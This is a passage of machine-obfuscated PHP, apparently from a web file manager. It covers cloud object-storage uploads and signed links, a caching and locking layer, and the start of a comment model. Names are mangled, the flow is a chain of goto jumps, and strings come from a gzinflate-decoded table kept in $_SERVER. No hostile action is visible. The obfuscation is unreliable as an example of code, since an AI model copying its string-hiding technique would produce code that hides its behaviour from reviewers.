trim($C—ÊĞ¦¾, $E•–Ğ§øôÔ[8]) . $E•–Ğ§øôÔ[8] : $C—ÊĞ¦¾; $dõ…÷¸ğò‚ = get_file_mime(get_path_ext($C—ÊĞ¦¾)); goto a‚È“èŞ; BŞ“àŞ¥ñ¿: $A¦É©“ï‘ñ = $this->copyFile($C—ÊĞ¦¾, $C—ÊĞ¦¾, array($E•–Ğ§øôÔ[193] => $A¦É©“ï‘ñ[$E•–Ğ§øôÔ[194]])); return $A¦É©“ï‘ñ ? !0 : !1; goto bğƒÉÏŸ; a‚È“èŞ: $A¦É©“ï‘ñ = $this->client->putObject($D£‡±´ÈâÕ, $this->bucket, $C—ÊĞ¦¾, $E•–Ğ§øôÔ[182], array(), $dõ…÷¸ğò‚); if (!$A¦É©“ï‘ñ) { return !1; } if ($e÷Öš† Ü´) { return !0; } goto BŞ“àŞ¥ñ¿; bğƒÉÏŸ: } public function fileSubstr($AÛ¿‡İÓ¡, $e‰¯ÈÌ¨ø¥, $d×½«Ä‹¶) { $F¤»ê‡²¾ñ = $e‰¯ÈÌ¨ø¥ + $d×½«Ä‹¶ - 1; return $this->client->getObject($this->bucket, $AÛ¿‡İÓ¡, array($_SERVER[ÚŠ•´ÍéÒÑÔ][195] => "\142\x79\164\x65\x73\x3d{$e‰¯ÈÌ¨ø¥}\55{$F¤»ê‡²¾ñ}")); } public function upload($FéºšãòÈ, $C“Š¯»„½, $FñŠÈ“İÕ£ = false, $f…•‡šéä = REPEAT_REPLACE) { $f•¦àù— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÄ«Ï±Œš™ = array($f•¦àù—[193] => @md5_file($C“Š¯»„½)); $F˜ëÍ¦ˆß = array($f•¦àù—[196] => get_file_mime(get_path_ext($FéºšãòÈ))); if (IO::size($C“Š¯»„½) <= 1024 * 1024 * 200) { $f“‡¡œ´†” = $this->client->putObjectFile($C“Š¯»„½, $this->bucket, $FéºšãòÈ, $f•¦àù—[182], $dÄ«Ï±Œš™, $F˜ëÍ¦ˆß); return !empty($f“‡¡œ´†”) ? $this->getPathOuter($FéºšãòÈ) : !1; } $c¹ÂèÌËÖ© = $this->client->multiUploadObject($C“Š¯»„½, $this->bucket, trim($FéºšãòÈ, $f•¦àù—[8]), $dÄ«Ï±Œš™, $F˜ëÍ¦ˆß); return $c¹ÂèÌËÖ© ? $this->getPathOuter($FéºšãòÈ) : !1; } public function download($D®Ø¡ÙÔ‰, $bÊó¬ÄÁ²) { if (!@is_dir($this->pathFather($bÊó¬ÄÁ²)) && !IO::mkdir($this->pathFather($bÊó¬ÄÁ²))) { return !1; } $b†á¦îµí = $this->client->getObject($this->bucket, $D®Ø¡ÙÔ‰, array(), $bÊó¬ÄÁ²); return $b†á¦îµí !== !1 ? $bÊó¬ÄÁ² : !1; } public function link($AŸ‡Şâ…ï, $cëÚªÒõô¿ = array()) { $dáŸÉ ßæô =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->signVer == $dáŸÉ ßæô[197]) { return $this->client->getAuthenticatedURL($this->bucket, $AŸ‡Şâ…ï, 3600 * 12, $cëÚªÒõô¿); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($AŸ‡Şâ…ï, $dáŸÉ ßæô[8]), 3600 * 12, $this->region, array(), !0, $cëÚªÒõô¿); } public function fileOut($cË„§¿¯„, $c´º¨¼á¥± = false, $dé«”ßÈÜ‘ = false, $F‘ä»…£ = '') { goto d÷ì¿Öœ¸; d÷ì¿Öœ¸: $C³ˆçŠôµÎ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$dé«”ßÈÜ‘) { $dé«”ßÈÜ‘ = $this->pathThis($cË„§¿¯„); } $aÎ¯·å’ó† = get_file_mime(get_path_ext($dé«”ßÈÜ‘)); goto C³ƒÍ­§Ë÷; C³ƒÍ­§Ë÷: if ($aÎ¯·å’ó† == $C³ˆçŠôµÎ[198]) { return parent::fileOut($cË„§¿¯„, $c´º¨¼á¥±, $dé«”ßÈÜ‘, $F‘ä»…£); } $c´º¨¼á¥± = $c´º¨¼á¥± ? $C³ˆçŠôµÎ[199] : $C³ˆçŠôµÎ[200]; $EÓ˜·îÀæ¸ = array($C³ˆçŠôµÎ[201] => $c´º¨¼á¥± . $C³ˆçŠôµÎ[202] . rawurlencode($dé«”ßÈÜ‘), $C³ˆçŠôµÎ[203] => $aÎ¯·å’ó†); goto cƒ¦­š‚šÉ; cƒ¦­š‚šÉ: $A›Öõµ°ëæ = $this->link($cË„§¿¯„, $EÓ˜·îÀæ¸); $this->fileOutLink($A›Öõµ°ëæ); goto D„‡äˆÌ; D„‡äˆÌ: } public function fileOutServer($b°È ğ§², $bÕÉ¬»õ¨‡ = false, $cµ‡×ò”¥» = false, $cÏ„¾º¿Ùß = '') { parent::fileOut($b°È ğ§², $bÕÉ¬»õ¨‡, $cµ‡×ò”¥», $cÏ„¾º¿Ùß); } public function fileOutImage($fñ©—Áä‘İ, $a°¸­µë§ = 250) { $d±‹©ã¥Äé = $this->link($fñ©—Áä‘İ); $this->fileOutLink($d±‹©ã¥Äé); } public function fileOutImageServer($B¼ó¯Û÷Ö¶, $c–ë±½¦ù = 250) { parent::fileOutImage($B¼ó¯Û÷Ö¶, $c–ë±½¦ù); } public function hashMd5($f†ê •‚æ, $D‹ã¦§Øê = '') { $CŒˆÆÎ¡ìİ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BéêìåøÂ = $this->objectMeta($f†ê •‚æ); if (!$BéêìåøÂ) { return !1; } $D‹ã¦§Øê = $D‹ã¦§Øê ? $D‹ã¦§Øê : _get($BéêìåøÂ, $CŒˆÆÎ¡ìİ[204]); $D‹ã¦§Øê = $D‹ã¦§Øê ? $D‹ã¦§Øê : _get($BéêìåøÂ, $CŒˆÆÎ¡ìİ[194], $CŒˆÆÎ¡ìİ[33]); return $D‹ã¦§Øê; } public function uploadFormData($C˜ã™ÔÚ¶Ï, $F÷ÒÄïÊ©Ù = 3600) { $A‚’êÀƒ³ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d×ÑˆÜ… = $this->pathFather($C˜ã™ÔÚ¶Ï); $BÒ·ÀÉÄİÙ = $this->client->getHttpUploadPostParams($this->bucket, $d×ÑˆÜ…, $A‚’êÀƒ³[182], $F÷ÒÄïÊ©Ù); return array_merge((array) $BÒ·ÀÉÄİÙ, array($A‚’êÀƒ³[166] => $this->getHost())); } public function multiUploadFormData($DÛŸÌ‰ç”ï, $D‘¬­‘‘ğ = 3600) { $AøùÕˆº  =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B«»óæÄî– = gmdate($AøùÕˆº [205]); $d®Æ¸ÔÒ¥¦ = array(); $a‹˜ó¤Ÿ© = $this->client->getUploadId($this->bucket, $DÛŸÌ‰ç”ï, $d®Æ¸ÔÒ¥¦); if (!$a‹˜ó¤Ÿ©) { return !1; } return array($AøùÕˆº [206] => $a‹˜ó¤Ÿ©, $AøùÕˆº [166] => $this->getHost() . $AøùÕˆº [8] . $this->pathEncode($DÛŸÌ‰ç”ï), $AøùÕˆº [207] => $B«»óæÄî–, $AøùÕˆº [89] => $DÛŸÌ‰ç”ï); } public function multiUploadAuthData($BÎÑØµ­, $d®ø«„¥¶¯ = array()) { goto a•¦¨Ü«ŒØ; eÍ­Ÿİ°ç‚: $aÑÒˆŞ‘È¢ = array($e­ìÏÆ¥‰Š[209], $e­ìÏÆ¥‰Š[33], $e­ìÏÆ¥‰Š[116], $e­ìÏÆ¥‰Š[33], "\170\x2d\141\155\x7a\55\x64\x61\164\x65\72{$C”÷¬Üğæİ}", $e­ìÏÆ¥‰Š[8] . $this->bucket . $e­ìÏÆ¥‰Š[8] . $this->pathEncode($e¦¤ßãÍ­”) . $d¼Ëê¬’¾è); if (strpos($d¼Ëê¬’¾è, $e­ìÏÆ¥‰Š[210]) === 0) { $aÑÒˆŞ‘È¢[0] = $e­ìÏÆ¥‰Š[211]; } if (isset($d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[212]]) && $d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[212]] == $e­ìÏÆ¥‰Š[213]) { $aÑÒˆŞ‘È¢[0] = $e­ìÏÆ¥‰Š[213]; } goto FÄ²Áù˜‰; cšÂµ©•Í: $e¦¤ßãÍ­” = $d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[89]]; unset($d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[89]]); if (isset($d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[208]])) { $d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[207]] = $C”÷¬Üğæİ; return $this->listUploadParts($e¦¤ßãÍ­”, $d®ø«„¥¶¯); } goto eÍ­Ÿİ°ç‚; a•¦¨Ü«ŒØ: $e­ìÏÆ¥‰Š =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C”÷¬Üğæİ = isset($d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[207]]) ? $d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[207]] : gmdate($e­ìÏÆ¥‰Š[205]); $d¼Ëê¬’¾è = isset($d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[157]]) ? $d®ø«„¥¶¯[$e­ìÏÆ¥‰Š[157]] : $e­ìÏÆ¥‰Š[33]; goto cšÂµ©•Í; FÓÈèç§ŸÍ: if (strpos($d¼Ëê¬’¾è, $e­ìÏÆ¥‰Š[210]) === 0) { return array($e­ìÏÆ¥‰Š[217] => $E§ ¨›‹ç˜, $e­ìÏÆ¥‰Š[207] => $C”÷¬Üğæİ); } return $E§ ¨›‹ç˜; goto D¼Å²š¿„ô; FÄ²Áù˜‰: $d°¥Ğ»’æ = implode($e­ìÏÆ¥‰Š[214], $aÑÒˆŞ‘È¢); $eË’Š­ïçÔ = base64_encode(hash_hmac($e­ìÏÆ¥‰Š[215], $d°¥Ğ»’æ, $this->secret, !0)); $E§ ¨›‹ç˜ = $e­ìÏÆ¥‰Š[216] . $this->accessKey . $e­ìÏÆ¥‰Š[4] . $eË’Š­ïçÔ; goto FÓÈèç§ŸÍ; D¼Å²š¿„ô: } public function listUploadParts($AˆĞæ†Ë, $Bàİ›­µâ„ = array()) { goto d¼ôªë; d¼ôªë: $cğœò˜Áª‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E…—ùê£Ãİ = str_replace($cğœò˜Áª‘[218], $cğœò˜Áª‘[33], $Bàİ›­µâ„[$cğœò˜Áª‘[157]]); $a„ôà‰ÂÀĞ = $this->client->listParts($this->bucket, $AˆĞæ†Ë, $E…—ùê£Ãİ); goto aâ±ã«Çá; aâ±ã«Çá: if (!$a„ôà‰ÂÀĞ) { return !1; } unset($Bàİ›­µâ„[$cğœò˜Áª‘[208]], $Bàİ›­µâ„[$cğœò˜Áª‘[212]]); $Bàİ›­µâ„[$cğœò˜Áª‘[89]] = $AˆĞæ†Ë; goto cƒ¸ïÙ÷´¦; cƒ¸ïÙ÷´¦: $CÒŞÃâÎ§Ç = $this->multiUploadAuthData($AˆĞæ†Ë, $Bàİ›­µâ„); if (empty($CÒŞÃâÎ§Ç)) { return !1; } return array($cğœò˜Áª‘[217] => $CÒŞÃâÎ§Ç, $cğœò˜Áª‘[207] => $Bàİ›­µâ„[$cğœò˜Áª‘[207]], $cğœò˜Áª‘[219] => $a„ôà‰ÂÀĞ); goto dªâªô; dªâªô: } public function getHost() { return parent::getHost() . $_SERVER[ÚŠ•´ÍéÒÑÔ][8] . $this->bucket; } public function size($F¶÷¯ó£Õ†) { $eÂ«ëÕ† = $this->objectMeta($F¶÷¯ó£Õ†); return $eÂ«ëÕ† ? $eÂ«ëÕ†[$_SERVER[ÚŠ•´ÍéÒÑÔ][77]] : 0; } public function info($bò¶¥Õ) { if ($this->isFolder($bò¶¥Õ)) { return $this->folderInfo($bò¶¥Õ); } else { if ($this->isFile($bò¶¥Õ)) { return $this->fileInfo($bò¶¥Õ); } } return !1; } public function exist($eªµ¡§šª) { return $this->isFile($eªµ¡§šª) || $this->isFolder($eªµ¡§šª); } public function isFile($fí°§…ã—²) { return !$this->isFolder($fí°§…ã—²) && $this->objectMeta($fí°§…ã—²); } public function isFolder($EİÇÓğÛ©) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][220], $EİÇÓğÛ©); } protected function objectMeta($E›ø‰ÎçÆ) { return $this->cacheMethod($_SERVER[ÚŠ•´ÍéÒÑÔ][221], $E›ø‰ÎçÆ); } protected function _objectMeta($BàÔ×íØ¥ä) { $eéõã»¡ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BàÔ×íØ¥ä = rtrim($BàÔ×íØ¥ä, $eéõã»¡ä[8]); try { $Eõàõäœ ƒ = $this->client->getObjectInfo($this->bucket, $BàÔ×íØ¥ä); if (!isset($Eõàõäœ ƒ[$eéõã»¡ä[204]]) && isset($Eõàõäœ ƒ[$eéõã»¡ä[222]])) { $Eõàõäœ ƒ[$eéõã»¡ä[204]] = $Eõàõäœ ƒ[$eéõã»¡ä[222]]; } } catch (OSS\Core\OssException $C‡‰Ò´ËÈÒ) { $Eõàõäœ ƒ = !1; } if (!$Eõàõäœ ƒ) { } return $Eõàõäœ ƒ; } protected function _isFolder($dõ‘ø¼ô¢Æ) { goto C·óöÃå¾Ä; C·óöÃå¾Ä: $CêµĞ›×›ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dõ‘ø¼ô¢Æ = rtrim($dõ‘ø¼ô¢Æ, $CêµĞ›×›ù[8]); if ($dõ‘ø¼ô¢Æ == $CêµĞ›×›ù[33] || $dõ‘ø¼ô¢Æ == $CêµĞ›×›ù[8]) { return !0; } goto eÖ¯Í¿Í£¡; eÖ¯Í¿Í£¡: $EÙò„ËÆ‰ = $this->client->getBucket($this->bucket, $dõ‘ø¼ô¢Æ, null, 1); if (empty($EÙò„ËÆ‰)) { return !1; } $EÙò„ËÆ‰ = array_values($EÙò„ËÆ‰); goto bÚÌÄİçŞ³; bÚÌÄİçŞ³: if (substr($EÙò„ËÆ‰[0][$CêµĞ›×›ù[28]], -1) == $CêµĞ›×›ù[8]) { return !0; } if (get_path_this($EÙò„ËÆ‰[0][$CêµĞ›×›ù[28]]) == get_path_this($dõ‘ø¼ô¢Æ)) { return !1; } return !0; goto DÖôø¬†±; DÖôø¬†±: } } define($_SERVER[ÚŠ•´ÍéÒÑÔ][223], 1); goto fÀï„’‘ÑÁ; Eô±­ß†éŞ: define($_SERVER[ÚŠ•´ÍéÒÑÔ][0], $_SERVER[ÚŠ•´ÍéÒÑÔ][1]); $_SERVER[Ÿ²ù¬] = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][2], gzinflate(substr($_SERVER[ÚŠ•´ÍéÒÑÔ][3], 10, -8))); function Model($cåµÓ×¨¢´ = '', $cˆƒ„áñ = '', $dÁƒÈŠ“×³ = '') { goto e×ƒ—Ê”¾‚; e×ƒ—Ê”¾‚: $C¢³ï•Ó†® =& $_SERVER[Ÿ²ù¬]; static $D»ŒŠŠ‘Ğ = array(); $aÚï…‰Öœø = strtolower($cˆƒ„áñ . $C¢³ï•Ó†®[0] . $cåµÓ×¨¢´); goto a££¸Ç¹Ó; Cöšà”ùª: $D»ŒŠŠ‘Ğ[$aÚï…‰Öœø] = new ModelBase($cåµÓ×¨¢´, $cˆƒ„áñ, $dÁƒÈŠ“×³); return $D»ŒŠŠ‘Ğ[$aÚï…‰Öœø]; goto eÓ‹Á¾ºé; a££¸Ç¹Ó: if (isset($D»ŒŠŠ‘Ğ[$aÚï…‰Öœø])) { return $D»ŒŠŠ‘Ğ[$aÚï…‰Öœø]; } if ($cåµÓ×¨¢´) { $cåµÓ×¨¢´ = strtoupper($cåµÓ×¨¢´[0]) . substr($cåµÓ×¨¢´, 1); $d†Íâ¦ºã = $cåµÓ×¨¢´ . $C¢³ï•Ó†®[1]; if (class_exists($d†Íâ¦ºã)) { $D»ŒŠŠ‘Ğ[$aÚï…‰Öœø] = new $d†Íâ¦ºã(); return $D»ŒŠŠ‘Ğ[$aÚï…‰Öœø]; } } if (!$dÁƒÈŠ“×³) { $dÁƒÈŠ“×³ = $GLOBALS[$C¢³ï•Ó†®[2]][$C¢³ï•Ó†®[3]]; } goto Cöšà”ùª; eÓ‹Á¾ºé: } goto D«ƒå¾Ğ; Fµ¡îÖÇ×: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto D¸ÃÖäÛ‘î; AÛôêµ“‰‹: switch ($Bç¾ÌÑ‹˜ï[$A½õõ‹Œ»[748]]) { case $A½õõ‹Œ»[17]: self::$handle = Model($A½õõ‹Œ»[750]); break; case $A½õõ‹Œ»[751]: self::$handle = new CacheRedis($eÎá“ïàÙÓ, $BæÛÓ¹ğ‡ç); break; case $A½õõ‹Œ»[752]: self::$handle = new CacheMemcached($eÎá“ïàÙÓ, $BæÛÓ¹ğ‡ç); break; case $A½õõ‹Œ»[164]: self::$handle = new CacheFile($eÎá“ïàÙÓ, $BæÛÓ¹ğ‡ç); break; default: break; } return self::$handle; goto aµ¬½¶£Ô§; D¸ÃÖäÛ‘î: $A½õõ‹Œ» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fÚ°—Âí´; fÚ°—Âí´: $Bç¾ÌÑ‹˜ï = $GLOBALS[$A½õõ‹Œ»[6]][$A½õõ‹Œ»[334]]; $eÎá“ïàÙÓ = $Bç¾ÌÑ‹˜ï[$Bç¾ÌÑ‹˜ï[$A½õõ‹Œ»[748]]]; $BæÛÓ¹ğ‡ç = $Bç¾ÌÑ‹˜ï[$A½õõ‹Œ»[749]]; goto AÛôêµ“‰‹; aµ¬½¶£Ô§: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($EÎÍ¬ÃËÄ) { if (is_array($EÎÍ¬ÃËÄ) || is_object($EÎÍ¬ÃËÄ)) { $EÎÍ¬ÃËÄ = json_encode($EÎÍ¬ÃËÄ); } $EÎÍ¬ÃËÄ = rawurlencode($EÎÍ¬ÃËÄ); return KOD_SITE_ID . $_SERVER[ÚŠ•´ÍéÒÑÔ][70] . $EÎÍ¬ÃËÄ; } public static function get($CÀÛ£¦ç„Ø) { $d’ÀÔ‚ÂÕ– = self::key($CÀÛ£¦ç„Ø); if (!isset(self::$memoryCache[$d’ÀÔ‚ÂÕ–])) { CacheLock::lock($CÀÛ£¦ç„Ø); $aâÜ‚ĞåŞá = self::init()->get($d’ÀÔ‚ÂÕ–); CacheLock::unlock($CÀÛ£¦ç„Ø); self::$memoryCache[$d’ÀÔ‚ÂÕ–] = unserialize($aâÜ‚ĞåŞá); } return self::$memoryCache[$d’ÀÔ‚ÂÕ–]; } public static function set($céÍÓ¥ÈÄ, $e³÷Ş½¶³È, $eÒ“¹‹‘«Œ = false) { goto D¨¿ô »Û; AÓ“…«É÷¢: CacheLock::unlock($céÍÓ¥ÈÄ); return $C†…·‹ÄÍÍ; goto f¥“Ù‡ì—à; D¨¿ô »Û: $f•¤•İ—Š = self::key($céÍÓ¥ÈÄ); if (isset(self::$memoryCache[$f•¤•İ—Š]) && self::$memoryCache[$f•¤•İ—Š] === $e³÷Ş½¶³È) { return !0; } if ($eÒ“¹‹‘«Œ === 0) { self::$memoryCache[$f•¤•İ—Š] = $e³÷Ş½¶³È; return !0; } goto DÁêÁ¯ËôË; DÁêÁ¯ËôË: CacheLock::lock($céÍÓ¥ÈÄ); $C†…·‹ÄÍÍ = self::init()->set($f•¤•İ—Š, serialize($e³÷Ş½¶³È), $eÒ“¹‹‘«Œ); self::$memoryCache[$f•¤•İ—Š] = $e³÷Ş½¶³È; goto AÓ“…«É÷¢; f¥“Ù‡ì—à: } public static function remove($cÛŠŠÊëÙÊ) { goto c…ŠİÀ®á; fÜš‚Ş‘: return $dÃ©Ííç†; goto Fİ«Á„í; c…ŠİÀ®á: $Dµ¾¢ –¶‰ = self::key($cÛŠŠÊëÙÊ); unset(self::$memoryCache[$Dµ¾¢ –¶‰]); self::clearTimeout(); goto EÍ½÷‡¾‡ô; EÍ½÷‡¾‡ô: CacheLock::lock($cÛŠŠÊëÙÊ); $dÃ©Ííç† = self::init()->remove($Dµ¾¢ –¶‰); CacheLock::unlock($cÛŠŠÊëÙÊ); goto fÜš‚Ş‘; Fİ«Á„í: } public static function clearMemory($CÈÀĞŠŸ˜  = false) { if ($CÈÀĞŠŸ˜ ) { $CÈÀĞŠŸ˜  = self::key($CÈÀĞŠŸ˜ ); unset(self::$memoryCache[$CÈÀĞŠŸ˜ ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÚŠ•´ÍéÒÑÔ][753])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÚŠ•´ÍéÒÑÔ][754])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($cÛ´ÁÕò­™, $dâ£Åö¡ö¥) { $eó¨‘îìµÌ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->cachePath = $cÛ´ÁÕò­™[$eó¨‘îìµÌ[75]]; $this->prefix = $eó¨‘îìµÌ[755]; $this->cacheTime = $dâ£Åö¡ö¥; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($CÁë×‘¡äÌ) { $Cï÷Û•¨Ğ¦ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÁë×‘¡äÌ = str_replace(array($Cï÷Û•¨Ğ¦[756], $Cï÷Û•¨Ğ¦[95], $Cï÷Û•¨Ğ¦[69]), $Cï÷Û•¨Ğ¦[757], $CÁë×‘¡äÌ); return $this->cachePath . $Cï÷Û•¨Ğ¦[758] . $CÁë×‘¡äÌ . $Cï÷Û•¨Ğ¦[759]; } public function set($Cš±…¡ã¹à, $D¯ó‹®Îƒ’, $A ğ·¢«² = false) { $eÅ‚ä»¥Ë = $this->getFile($Cš±…¡ã¹à); if (file_put_contents($eÅ‚ä»¥Ë, $this->prefix . $D¯ó‹®Îƒ’, LOCK_EX)) { return !0; } @unlink($eÅ‚ä»¥Ë); return !1; } public function get($bÛÖ—ŞÀé¹) { $Fé…ƒÊœÊ¿ = $this->getFile($bÛÖ—ŞÀé¹); if (file_exists($Fé…ƒÊœÊ¿) && filemtime($Fé…ƒÊœÊ¿) < time() - $this->cacheTime) { @unlink($Fé…ƒÊœÊ¿); return !1; } $DœÄÊ—ªä = @file_get_contents($Fé…ƒÊœÊ¿); return substr($DœÄÊ—ªä, strlen($this->prefix)); } public function remove($cÊùÅ“Ææé) { $C¢•ÀÕ§¸„ = $this->getFile($cÊùÅ“Ææé); return @unlink($C¢•ÀÕ§¸„); } public function deleteAll() { $Eî¾’Ÿ½Î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d—©¨ì¬îŠ = scandir($this->cachePath); foreach ($d—©¨ì¬îŠ as $C¤ÈÛîâ›) { $BŠÏ¯Úõåİ = $this->cachePath . $C¤ÈÛîâ›; if (strpos($BŠÏ¯Úõåİ, $Eî¾’Ÿ½Î[759]) && strpos($BŠÏ¯Úõåİ, $Eî¾’Ÿ½Î[760])) { @unlink($BŠÏ¯Úõåİ); } } } public function clearTimeout() { $e¯’Å–†­¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AŞßï„öß = scandir($this->cachePath); foreach ($AŞßï„öß as $cÚÕ‡Ì£‚˜) { $aÒÎ†„ÕÊÇ = $this->cachePath . $cÚÕ‡Ì£‚˜; if (strpos($aÒÎ†„ÕÊÇ, $e¯’Å–†­¶[759]) && strpos($aÒÎ†„ÕÊÇ, $e¯’Å–†­¶[760]) && filemtime($aÒÎ†„ÕÊÇ) < time() - $this->cacheTime) { @unlink($aÒÎ†„ÕÊÇ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto CŒ¹ò‡¿á¼; cëŠ‰ÁŸ°: if ($Aàù†ÔÈ½Œ == $aºŠ¦•ŒĞ[17] && $FƒŠáÜÒµ == $aºŠ¦•ŒĞ[9]) { $Aàù†ÔÈ½Œ = $aºŠ¦•ŒĞ[164]; } switch ($Aàù†ÔÈ½Œ) { case $aºŠ¦•ŒĞ[751]: self::$handle = new CacheLockRedis(); break; case $aºŠ¦•ŒĞ[752]: self::$handle = new CacheLockMemcached(); break; case $aºŠ¦•ŒĞ[17]: self::$handle = new CacheLockDatabase(); break; case $aºŠ¦•ŒĞ[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto E§àƒ„ì–; CŒ¹ò‡¿á¼: $aºŠ¦•ŒĞ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (self::$handle) { return self::$handle; } $CÄŠÚÙ‰ = $GLOBALS[$aºŠ¦•ŒĞ[6]][$aºŠ¦•ŒĞ[334]]; goto CèÅÒÛ¡œŸ; CèÅÒÛ¡œŸ: self::$timeout = $CÄŠÚÙ‰[$aºŠ¦•ŒĞ[761]] ? $CÄŠÚÙ‰[$aºŠ¦•ŒĞ[761]] : 10; $FƒŠáÜÒµ = _get($GLOBALS[$aºŠ¦•ŒĞ[6]], $aºŠ¦•ŒĞ[762]); $Aàù†ÔÈ½Œ = $CÄŠÚÙ‰[$aºŠ¦•ŒĞ[748]] ? $CÄŠÚÙ‰[$aºŠ¦•ŒĞ[748]] : $aºŠ¦•ŒĞ[164]; goto cëŠ‰ÁŸ°; E§àƒ„ì–: } private static function key($BÂ°°èº†) { return $_SERVER[ÚŠ•´ÍéÒÑÔ][763] . Cache::key($BÂ°°èº†); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($cÈë½Á„½§ = '') { self::$errorMsg = $cÈë½Á„½§; } public static function lockGlobal($CÇ ƒŠİØé, $aˆ»¥á›Å») { return self::lock($CÇ ƒŠİØé, $aˆ»¥á›Å», !0); } public static function lock($F¢—»†øŠ, $a„‡ƒÚ½ = false, $fá—‹…³ê = false) { goto bÉï›£‰¿; AãÃ‰†…òá: if (!$fá—‹…³ê) { self::$lockItem[$BàãÁ¬¿†Ò] = !0; } return $aÒ…ò¹îƒ­; goto FìÄ÷‘¤¦‰; bÉï›£‰¿: $A¸°Å¦†ğ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Bù§ªèóå = self::init(); $BàãÁ¬¿†Ò = self::key($F¢—»†øŠ); goto Dæˆ´Üò…ò; Dæˆ´Üò…ò: $a„‡ƒÚ½ = $a„‡ƒÚ½ ? $a„‡ƒÚ½ : self::$timeout; $aÒ…ò¹îƒ­ = $Bù§ªèóå->lock($BàãÁ¬¿†Ò, $a„‡ƒÚ½); if (!$aÒ…ò¹îƒ­) { $EÂ›´„²áî = $A¸°Å¦†ğ[764] . $a„‡ƒÚ½ . $A¸°Å¦†ğ[67] . self::$errorMsg . $A¸°Å¦†ğ[67] . get_caller_msg(); $BÖçéîƒ¦Ù = "\114\157\143\x6b\x20\x61\x63\x74\x69\157\156\x3a\40{$BàãÁ¬¿†Ò}\x20\164\151\155\x65\157\x75\164\x2c\x6f\166\145\x72\40{$a„‡ƒÚ½}\x20\x73"; $BÖçéîƒ¦Ù = self::$errorMsg ? self::$errorMsg : $Aò„»©•„À; write_log($EÂ›´„²áî, $A¸°Å¦†ğ[765]); show_json($BÖçéîƒ¦Ù, !1); } goto AãÃ‰†…òá; FìÄ÷‘¤¦‰: } public static function lockGet($f¹÷Âù¨êï) { $B×ñ‚ê²â‰ = self::key($f¹÷Âù¨êï); if (self::$lockItem[$B×ñ‚ê²â‰]) { return self::$lockItem[$B×ñ‚ê²â‰]; } return self::init()->lockGet($B×ñ‚ê²â‰); } public static function unlock($FæÆ¹Œˆ˜) { $A·öéË“•â = self::key($FæÆ¹Œˆ˜); self::$lockItem[$A·öéË“•â] = null; return self::init()->unlock($A·öéË“•â); } public static function unlockRuntime() { $Béº‰á–éÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cºÎó£šµ = self::init(); $aíß¡éè = !1; foreach (self::$lockItem as $f¼Æ¤Äñ¬ => $Dåí‘Ç¯) { if (!$Dåí‘Ç¯) { continue; } $cºÎó£šµ->unlock($f¼Æ¤Äñ¬); if (!$aíß¡éè) { $aíß¡éè = !0; write_log($Béº‰á–éÊ[766] . $f¼Æ¤Äñ¬ . $Béº‰á–éÊ[67] . get_caller_msg(), $Béº‰á–éÊ[765]); continue; } write_log($Béº‰á–éÊ[766] . $f¼Æ¤Äñ¬, $Béº‰á–éÊ[765]); } } } goto D½ÔÂ–™‡Œ; Eåã±Ü›ìÓ: register_shutdown_function($_SERVER[Ÿ²ù¬][36]); set_error_handler($_SERVER[Ÿ²ù¬][49], $d…„ĞÉ‘½); if (function_exists($_SERVER[Ÿ²ù¬][50])) { set_exception_handler($_SERVER[Ÿ²ù¬][51]); } goto eÑèˆ—¬†; b‹Œ»ÏÃã: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\155\145" => "\x63\157\x6d\155\x65\x6e\x74\137\155\145\x74\x61", "\x6d\x65\164\141\x46\x69\x65\x6c\144" => "\143\x6f\x6d\155\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($D©¾ñÁŞÎÀ) { $Bò¹‰¯ĞÛÇ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; 